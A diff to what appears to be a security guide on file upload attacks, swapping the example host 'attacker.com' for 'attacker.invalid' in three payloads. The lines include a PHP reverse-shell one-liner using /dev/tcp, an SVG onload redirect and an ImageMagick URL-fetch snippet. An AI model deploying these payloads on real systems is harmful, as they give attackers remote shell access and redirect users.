@@ -447,7 +447,7 @@ Common file extensions and their potential security impacts:
   ```
 - **Reverse Shell Deployment**: Establishing persistent control
   ```php
-  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1'");?>
+  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.invalid/443 0>&1'");?>
   ```
 
 #### File Inclusion Attack Chains
@@ -527,7 +527,7 @@ Common file extensions and their potential security impacts:
 - **SVG Open Redirect**:
   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-  <svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg">
+  <svg onload="window.location='https://attacker.invalid'" xmlns="http://www.w3.org/2000/svg">
     <rect width="300" height="100"/>
   </svg>
   ```
@@ -570,7 +570,7 @@ Common file extensions and their potential security impacts:
 ```
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(http://attacker.com/)'
+fill 'url(http://attacker.invalid/)'
 pop graphic-context
 ```
 
